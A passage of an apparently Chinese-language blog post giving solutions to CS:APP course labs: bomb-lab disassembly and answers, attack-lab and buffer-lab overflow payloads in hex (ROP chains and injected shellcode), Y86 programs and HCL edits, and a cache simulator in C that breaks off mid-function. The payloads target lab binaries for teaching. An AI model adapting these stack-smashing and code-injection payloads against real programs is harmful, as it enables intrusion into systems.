+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">rcx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>var_20h;
+<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>) {
+    rdx <span style="color:#f92672">=</span> var_20h[i];
+    rcx.next <span style="color:#f92672">=</span> rdx;
+    rcx <span style="color:#f92672">=</span> rdx;
+}
+</code></pre></div><p>Final check: nodes should be sorted by value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">rbx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>var_20h;
+<span style="color:#66d9ef">for</span> (ebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>; ebp <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>; ebp<span style="color:#f92672">--</span>) {
+    rax <span style="color:#f92672">=</span> rbx.next;
+    eax <span style="color:#f92672">=</span> rax.value;
+    <span style="color:#66d9ef">if</span> (rbx.value <span style="color:#f92672">&lt;</span> eax) explode_bomb();
+    rbx <span style="color:#f92672">=</span> rbx.next;
+}
+</code></pre></div><p>node3 &gt; node4 &gt; node5 &gt; node6 &gt; node1 &gt; node2</p>
+<pre tabindex="0"><code>Good work!  On to the next...
+4 3 2 1 6 5
+Congratulations! You've defused the bomb!
+</code></pre><h3 id="secret-phase">Secret Phase</h3>
+<pre tabindex="0"><code>[0x004010f4]&gt; s sym.secret_phase
+[0x00401242]&gt; pdf
+            ; CALL XREF from sym.phase_defused @ 0x401630(x)
+┌ 81: sym.secret_phase ();
+│           0x00401242      53             push rbx
+│           0x00401243      e856020000     call sym.read_line
+│           0x00401248      ba0a000000     mov edx, 0xa                ; int base
+│           0x0040124d      be00000000     mov esi, 0                  ; char * *endptr
+│           0x00401252      4889c7         mov rdi, rax                ; const char *str
+│           0x00401255      e876f9ffff     call sym.imp.strtol         ; long strtol(const char *str, char * *endptr, int base)
+│           0x0040125a      4889c3         mov rbx, rax
+│           0x0040125d      8d40ff         lea eax, [rax - 1]
+│           0x00401260      3de8030000     cmp eax, 0x3e8              ; 1000
+│       ┌─&lt; 0x00401265      7605           jbe 0x40126c
+│       │   0x00401267      e8ce010000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.secret_phase @ 0x401265(x)
+│       └─&gt; 0x0040126c      89de           mov esi, ebx                ; int64_t arg2
+│           0x0040126e      bff0306000     mov edi, obj.n1             ; 0x6030f0 ; &quot;$&quot; ; int64_t arg1
+│           0x00401273      e88cffffff     call sym.fun7
+│           0x00401278      83f802         cmp eax, 2                  ; 2
+│       ┌─&lt; 0x0040127b      7405           je 0x401282
+│       │   0x0040127d      e8b8010000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.secret_phase @ 0x40127b(x)
+│       └─&gt; 0x00401282      bf38244000     mov edi, str.Wow__Youve_defused_the_secret_stage_ ; 0x402438 ; &quot;Wow! You've defused the secret stage!&quot; ; const char *s
+│           0x00401287      e884f8ffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040128c      e833030000     call sym.phase_defused
+│           0x00401291      5b             pop rbx
+└           0x00401292      c3             ret
+
+[0x00401242]&gt; s sym.fun7
+[0x00401204]&gt; pdf
+            ; CALL XREFS from sym.fun7 @ 0x401217(x), 0x40122d(x)
+            ; CALL XREF from sym.secret_phase @ 0x401273(x)
+┌ 62: sym.fun7 (int64_t arg1, signed int64_t arg2);
+│           ; arg int64_t arg1 @ rdi
+│           ; arg signed int64_t arg2 @ rsi
+│           0x00401204      4883ec08       sub rsp, 8
+│           0x00401208      4885ff         test rdi, rdi               ; arg1
+│       ┌─&lt; 0x0040120b      742b           je 0x401238
+│       │   0x0040120d      8b17           mov edx, dword [rdi]        ; arg1
+│       │   0x0040120f      39f2           cmp edx, esi                ; arg2
+│      ┌──&lt; 0x00401211      7e0d           jle 0x401220
+│      ││   0x00401213      488b7f08       mov rdi, qword [rdi + 8]    ; int64_t arg1
+│      ││   0x00401217      e8e8ffffff     call sym.fun7
+│      ││   0x0040121c      01c0           add eax, eax
+│     ┌───&lt; 0x0040121e      eb1d           jmp 0x40123d
+│     │││   ; CODE XREF from sym.fun7 @ 0x401211(x)
+│     │└──&gt; 0x00401220      b800000000     mov eax, 0
+│     │ │   0x00401225      39f2           cmp edx, esi                ; arg2
+│     │┌──&lt; 0x00401227      7414           je 0x40123d
+│     │││   0x00401229      488b7f10       mov rdi, qword [rdi + 0x10] ; int64_t arg1
+│     │││   0x0040122d      e8d2ffffff     call sym.fun7
+│     │││   0x00401232      8d440001       lea eax, [rax + rax + 1]
+│    ┌────&lt; 0x00401236      eb05           jmp 0x40123d
+│    ││││   ; CODE XREF from sym.fun7 @ 0x40120b(x)
+│    │││└─&gt; 0x00401238      b8ffffffff     mov eax, 0xffffffff         ; -1
+│    │││    ; CODE XREFS from sym.fun7 @ 0x40121e(x), 0x401227(x), 0x401236(x)
+│    └└└──&gt; 0x0040123d      4883c408       add rsp, 8
+└           0x00401241      c3             ret
+</code></pre><p>Readline and convert to number.</p>
+<p>The number should smaller than 1001, and the result of <code>fun7()</code> should be 2.</p>
+<p>Arg1 is a root of a tree.</p>
+<pre tabindex="0"><code>n1
+    dq 24h
+    dq offset n21
+    dq offset n22
+    dq 0
+
+n21
+    dq 8
+    dq offset n31
+    dq offset n32
+    dq 0
+
+n22
+    dq 32h
+    dq offset n33
+    dq offset n34
+    dq 0
+
+n32
+    dq 16h
+    dq offset n43
+    dq offset n44
+    dq 0
+
+n33
+    dq 2Dh
+    dq offset n45
+    dq offset n46
+    dq 0
+
+n31
+    dq 6
+    dq offset n41
+    dq offset n42
+    dq 0
+
+n34
+    dq 6Bh
+    dq offset n47
+    dq offset n48
+    dq 0
+
+n45
+    dq 28h
+    dq 0
+    dq 0
+    dq 0
+
+n41
+    dq 1
+    dq 0
+    dq 0
+    dq 0
+
+n47
+    dq 63h
+    dq 0
+    dq 0
+    dq 0
+
+n44
+    dq 23h
+    dq 0
+    dq 0
+    dq 0
+
+n42
+    dq 7
+    dq 0
+    dq 0
+    dq 0
+
+n43
+    dq 14h
+    dq 0
+    dq 0
+    dq 0
+
+n46
+    dq 2Fh
+    dq 0
+    dq 0
+    dq 0
+
+n48
+    dq 3E9h
+    dq 0
+    dq 0
+    dq 0
+</code></pre><p>The tree:</p>
+<pre tabindex="0"><code>
+                      0x24
+          v------------|------------v
+          8                        0x32
+    v-----|------v            v-----|------v
+    6           0x16         0x2d         0x6b
+v---|---v    v---|---v    v---|---v    v---|---v
+1       7   0x14    0x23 0x28    0x2f 0x63   0x3e9
+</code></pre><p>In fun7:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">rdi <span style="color:#f92672">=</span> root;
+rsi <span style="color:#f92672">=</span> input_num;
+edx <span style="color:#f92672">=</span> root.value;
+<span style="color:#66d9ef">if</span> (edx <span style="color:#f92672">&gt;</span> rsi) {
+    rdi <span style="color:#f92672">=</span> rdi.lchild;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">fun7</span>(rdi, rsi);
+}
+eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">if</span> (edx <span style="color:#f92672">==</span> esi) {
+    <span style="color:#66d9ef">return</span> eax;
+}
+<span style="color:#66d9ef">else</span> {
+    rdi <span style="color:#f92672">=</span> rdi.rchild;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> fun7(rdi, rsi);
+}
+</code></pre></div><p>The target is 2, so we need:</p>
+<pre tabindex="0"><code>ret 0
+ret 1 + 2 * 0
+ret 2 * (1 + 2 * 0)
+</code></pre><p>Therefore, the input should be 22.</p>
+<pre tabindex="0"><code>Welcome to my fiendish little bomb. You have 6 phases with
+which to blow yourself up. Have a nice day!
+Border relations with Canada have never been better.
+Phase 1 defused. How about the next one?
+1 2 4 8 16 32
+That's number 2.  Keep going!
+7 327
+Halfway there!
+0 0 DrEvil
+So you got that one.  Try this one.
+ionefg
+Good work!  On to the next...
+4 3 2 1 6 5
+Curses, you've found the secret phase!
+But finding it and solving it are quite different...
+22
+Wow! You've defused the secret stage!
+Congratulations! You've defused the bomb!
+</code></pre><h2 id="lab3-attack-lab">Lab3 Attack-lab</h2>
+<p>直接使用 ROP 打了</p>
+<h3 id="phase-1-1">Phase 1</h3>
+<pre tabindex="0"><code>61 61 61 61 61 61 61 61
+61 61 61 61 61 61 61 61
+61 61 61 61 61 61 61 61
+61 61 61 61 61 61 61 61
+62 62 62 62 62 62 62 62
+C0 17 40 00 00 00 00 00
+</code></pre><h3 id="phase-2-1">Phase 2</h3>
+<pre tabindex="0"><code>61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61
+62 62 62 62 62 62 62 62
+1b 14 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+EC 17 40 00 00 00 00 00
+</code></pre><h3 id="phase-3-1">Phase 3</h3>
+<pre tabindex="0"><code>35 39 62 39 39 37 66 61 
+00 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61
+62 62 62 62 62 62 62 62
+1b 14 40 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+FA 18 40 00 00 00 00 00
+</code></pre><blockquote>
+<p>Phase 4 和 5 不知道为什么打不通，跳过了</p>
+</blockquote>
+<h2 id="lab4-buffer-lab">Lab4 Buffer-lab</h2>
+<p>感觉像另一个版本的 Attack lab</p>
+<h3 id="phase-0">Phase 0</h3>
+<pre tabindex="0"><code>61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+18 8C 04 08
+</code></pre><h3 id="phase-1-2">Phase 1</h3>
+<pre tabindex="0"><code>61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+42 8C 04 08
+63 63 63 63
+8e 3e aa 69
+</code></pre><h3 id="phase-2-2">Phase 2</h3>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">movl $0x69aa3e8e, 0x0804D100
+push $0x08048C9D
+ret
+</code></pre><pre tabindex="0"><code>c7 05 00 d1 04 08 8e
+3e aa 69
+68 9d 8c 04 08
+c3
+
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+28 3d 68 55
+</code></pre><h3 id="phase-3-2">Phase 3</h3>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov $0x69aa3e8e, %eax
+mov $0x55555555, %ebp
+push $0x08048DBE
+ret
+</code></pre><pre tabindex="0"><code>b8 8e 3e aa 69
+bd 80 3d 68 55
+68 be 8d 04 08
+c3
+
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+61 61 61 61
+62 62 62 62
+28 3d 68 55
+</code></pre><h3 id="phase-4-1">Phase 4</h3>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov $0x69aa3e8e, %eax
+mov %esp, %ebp
+add $0x28, %ebp
+push $0x08048DBE
+ret
+</code></pre><pre tabindex="0"><code>b8 8e 3e aa 69
+89 e5
+83 c5 28
+68 be 8d 04 08
+c3
+
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61 
+61 61 61 61 61 61 61 61
+
+62 62 62 62
+48 3b 68 55
+</code></pre><h2 id="lab5-arch-lab">Lab5 Arch-lab</h2>
+<h3 id="part-a">Part A</h3>
+<p>第一部分是使用 Y64 语言写几个程序</p>
+<p>写的不规范，能跑就行</p>
+<p>sum.ys</p>
+<pre tabindex="0"><code class="language-y64" data-lang="y64">    .pos 0
+init:
+    irmovq Stack, %rsp
+    call Main
+    halt
+
+Main:
+    irmovq ele1, %rdi
+    call Sum
+    ret
+
+Sum:
+    xorq %rax, %rax
+    rrmovq %rdi, %rcx
+  loop:
+    andq %rcx, %rcx
+    je end
+    mrmovq 0(%rcx), %rbx
+    addq %rbx, %rax
+    mrmovq 8(%rcx), %rcx
+    jmp loop
+  end:
+    ret
+
+# Sample linked list
+.align 8
+ele1:
+.quad 0x00a
+.quad ele2
+ele2:
+.quad 0x0b0
+.quad ele3
+ele3:
+.quad 0xc00
+.quad 0
+
+    .pos 0x200
+Stack:
+</code></pre><p>rsum.ys</p>
+<pre tabindex="0"><code class="language-y64" data-lang="y64">    .pos 0
+init:
+    irmovq Stack, %rsp
+    call Main
+    halt
+
+Main:
+    irmovq ele1, %rdi
+    xorq %rax, %rax
+    call rsum_list
+    ret
+
+rsum_list:
+  loop:
+    andq %rdi, %rdi
+    je end
+    mrmovq 0(%rdi), %rbx
+    pushq %rbx
+    mrmovq 8(%rdi), %rdi
+    call rsum_list
+    popq %rbx
+    addq %rbx, %rax
+    jmp loop
+  end:
+    ret
+
+# Sample linked list
+.align 8
+ele1:
+.quad 0x00a
+.quad ele2
+ele2:
+.quad 0x0b0
+.quad ele3
+ele3:
+.quad 0xc00
+.quad 0
+
+    .pos 0x200
+Stack:
+</code></pre><p>copy.ys</p>
+<pre tabindex="0"><code class="language-y64" data-lang="y64">    .pos 0
+init:
+    irmovq Stack, %rsp
+    call Main
+    halt
+
+Main:
+    irmovq src, %rdi
+    irmovq dest, %rsi
+    irmovq $3, %rdx
+    call copy
+    ret
+
+copy:
+    irmovq $1, %r8
+    irmovq $8, %r9
+    xorq %rax, %rax
+    rrmovq %rdx, %rcx
+  loop:
+    mrmovq 0(%rdi), %rbx
+    rmmovq %rbx, 0(%rsi)
+    xorq %rbx, %rax
+    addq %r9, %rdi
+    addq %r9, %rsi
+    subq %r8, %rcx
+    andq %rcx, %rcx
+    jne loop
+    ret
+
+# Sample linked list
+.align 8
+# Source block
+src:
+.quad 0x00a
+.quad 0x0b0
+.quad 0xc00
+# Destination block
+dest:
+.quad 0x111
+.quad 0x222
+.quad 0x333
+
+    .pos 0x200
+Stack:
+</code></pre><h3 id="part-b">Part B</h3>
+<p>这部分不太会，全靠注释和网上资料做的</p>
+<p>参考书上的相似指令，自己画了个整体架构</p>
+<pre tabindex="0"><code>#############################################
+#     Stage    # iaddq V, rB                #
+#############################################
+#              # icode: ifun &lt;- M_1[PC]     #
+# Fetch Stage  # rA: rB      &lt;- M_1[PC + 1] #
+#              # valC        &lt;- M_8[PC + 2] #
+#              # valP        &lt;- PC + 10     #
+#############################################
+# Decode Stage # valB &lt;- R[rB]              #
+#############################################
+# Excuse Stage # valE &lt;- valC + valB        #
+#############################################
+#   Writeback  #                            #
+#     Stage    # R[rB] &lt;- valE              #
+#############################################
+#   Update PC  # PC &lt;- valP                 #
+#############################################
+</code></pre><p>Fetch 阶段</p>
+<pre tabindex="0"><code># Determine instruction code
+word icode = [
+	imem_error: INOP;
+	1: imem_icode;		# Default: get from instruction memory
+];
+
+# Determine instruction function
+word ifun = [
+	imem_error: FNONE;
+	1: imem_ifun;		# Default: get from instruction memory
+];
+
+bool instr_valid = icode in 
+	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
+	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };
+
+# Does fetched instruction require a regid byte?
+bool need_regids =
+	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
+		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ};
+
+# Does fetched instruction require a constant word?
+bool need_valC =
+	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };
+</code></pre><p>Decode 阶段</p>
+<pre tabindex="0"><code>## What register should be used as the A source?
+word srcA = [
+	icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  } : rA;
+	icode in { IPOPQ, IRET } : RRSP;
+	1 : RNONE; # Don't need register
+];
+
+## What register should be used as the B source?
+word srcB = [
+	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;
+	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
+	1 : RNONE;  # Don't need register
+];
+
+## What register should be used as the E destination?
+word dstE = [
+	icode in { IRRMOVQ } &amp;&amp; Cnd : rB;
+	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
+	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
+	1 : RNONE;  # Don't write any register
+];
+
+## What register should be used as the M destination?
+word dstM = [
+	icode in { IMRMOVQ, IPOPQ } : rA;
+	1 : RNONE;  # Don't write any register
+];
+</code></pre><p>Execute 阶段</p>
+<pre tabindex="0"><code>## Select input A to ALU
+word aluA = [
+	icode in { IRRMOVQ, IOPQ } : valA;
+	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;
+	icode in { ICALL, IPUSHQ } : -8;
+	icode in { IRET, IPOPQ } : 8;
+	# Other instructions don't need ALU
+];
+
+## Select input B to ALU
+word aluB = [
+	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
+		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
+	icode in { IRRMOVQ, IIRMOVQ } : 0;
+	# Other instructions don't need ALU
+];
+
+## Set the ALU function
+word alufun = [
+	icode == IOPQ : ifun;
+	1 : ALUADD;
+];
+
+## Should the condition codes be updated?
+bool set_cc = icode in { IOPQ, IIADDQ };
+</code></pre><p>PC 更新阶段不需要更改</p>
+<h2 id="lab7-cache-lab">Lab7 Cache-lab</h2>
+<p>需要实现一个 LRU 的 Cache 系统</p>
+<p>不知道该怎么实现，直接逆 <code>csim-ref</code> 加抄网上资料了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;getopt.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;cachelab.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> s <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, E <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, v <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tracefile <span style="color:#f92672">=</span> NULL;
+<span style="color:#66d9ef">int</span> S <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, B <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">int</span> hit_count, miss_count, eviction_count;
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> lru_counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, set_index_mask;
+
+
+FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> NULL;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+    <span style="color:#66d9ef">char</span> valid_bit;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> tag;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> lru;
+} cache_line_t, <span style="color:#f92672">*</span>cache_set_t, <span style="color:#f92672">**</span>cache_t;
+
+cache_t cache;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+
+} Node;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printUsage</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name){
+    printf(<span style="color:#e6db74">&#34;./%s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;&#34;</span>, name);
+    puts(<span style="color:#e6db74">&#34;Options:&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  -h         Print this help message.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  -v         Optional verbose flag.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  -s &lt;num&gt;   Number of set index bits.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  -E &lt;num&gt;   Number of lines per set.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  -b &lt;num&gt;   Number of block offset bits.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  -t &lt;file&gt;  Trace file.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;Examples:&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace&#34;</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">initCache</span>() {
+    cache <span style="color:#f92672">=</span> (cache_t)malloc(<span style="color:#66d9ef">sizeof</span>(cache_set_t) <span style="color:#f92672">*</span> S);
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> S; i<span style="color:#f92672">++</span>) {
+        cache[i] <span style="color:#f92672">=</span> (cache_set_t)malloc(<span style="color:#66d9ef">sizeof</span>(cache_line_t) <span style="color:#f92672">*</span> E);
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> E; j<span style="color:#f92672">++</span>) {
+            cache[i][j].valid_bit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            cache[i][j].tag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            cache[i][j].lru <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        }
+    }
+    set_index_mask <span style="color:#f92672">=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> s) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">releaseCache</span>() {
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> S; i<span style="color:#f92672">++</span>) {
+        free(cache[i]);
+        cache[i] <span style="color:#f92672">=</span> NULL;
+    }
+    free(cache);
+    cache <span style="color:#f92672">=</span> NULL;
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">accessData</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> address){
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> eviction_lru <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> eviction_line <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> tag <span style="color:#f92672">=</span> address <span style="color:#f92672">&gt;&gt;</span> (s <span style="color:#f92672">+</span> b);
+    cache_set_t cache_set <span style="color:#f92672">=</span> cache[(address <span style="color:#f92672">&gt;&gt;</span> b) <span style="color:#f92672">&amp;</span> set_index_mask];
+    <span style="color:#66d9ef">int</span> i;
+    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>i) {
+        <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&gt;=</span> E) {
+            <span style="color:#f92672">++</span>miss_count;
+            <span style="color:#66d9ef">if</span> (v)
+                printf(<span style="color:#e6db74">&#34;miss &#34;</span>);
+            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> E; <span style="color:#f92672">++</span>j) {
+                <span style="color:#66d9ef">if</span> (cache_set[j].lru <span style="color:#f92672">&lt;</span> eviction_lru) {
+                    eviction_line <span style="color:#f92672">=</span> j;
+                    eviction_lru <span style="color:#f92672">=</span> cache_set[j].lru;
+                }
+            }
+            <span style="color:#66d9ef">if</span> (cache_set[eviction_line].valid_bit) {
+                <span style="color:#f92672">++</span>eviction_count;
+                <span style="color:#66d9ef">if</span> (v) 
+                    printf(<span style="color:#e6db74">&#34;eviction &#34;</span>);
+            }
+            cache_set[eviction_line].valid_bit <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+            cache_set[eviction_line].tag <span style="color:#f92672">=</span> tag;
+            cache_set[eviction_line].lru <span style="color:#f92672">=</span> lru_counter<span style="color:#f92672">++</span>;
+            <span style="color:#66d9ef">return</span>;
+        }
+        <span style="color:#66d9ef">if</span> (cache_set[i].valid_bit <span style="color:#f92672">&amp;&amp;</span> cache_set[i].tag <span style="color:#f92672">==</span> tag) {
+            <span style="color:#66d9ef">break</span>;
+        }
+    }
+    <span style="color:#f92672">++</span>hit_count;
+    <span style="color:#66d9ef">if</span> (v) 
+        printf(<span style="color:#e6db74">&#34;hit &#34;</span>);
+    cache_set[i].lru <span style="color:#f92672">=</span> lru_counter<span style="color:#f92672">++</span>;
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">replayTrace</span>(FILE<span style="color:#f92672">*</span> f) {
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> address;
+    <span style="color:#66d9ef">int</span> size;
+    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];
+    <span style="color:#66d9ef">while</span> (fgets(buf, <span style="color:#ae81ff">1023</span>, f)) {
